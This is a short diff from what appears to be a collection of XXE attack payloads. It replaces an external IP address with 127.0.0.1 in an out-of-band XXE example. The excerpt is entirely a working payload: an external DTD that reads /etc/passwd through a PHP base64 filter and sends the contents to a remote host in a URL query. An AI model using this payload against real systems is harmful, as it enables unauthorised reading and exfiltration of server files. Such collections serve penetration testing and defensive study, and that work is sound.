@@ -125,15 +125,15 @@ XXE OOB with DTD and PHP filter
 <?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
-<!ENTITY % sp SYSTEM "http://92.222.81.2/dtd.xml">
+<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
 %sp;
 %param1;
 ]>
 <r>&exfil;</r>
 
-File stored on http://92.222.81.2/dtd.xml
+File stored on http://127.0.0.1/dtd.xml
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
-<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://92.222.81.2/dtd.xml?%data;'>">
+<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
 ```
 
 XXE Inside SOAP
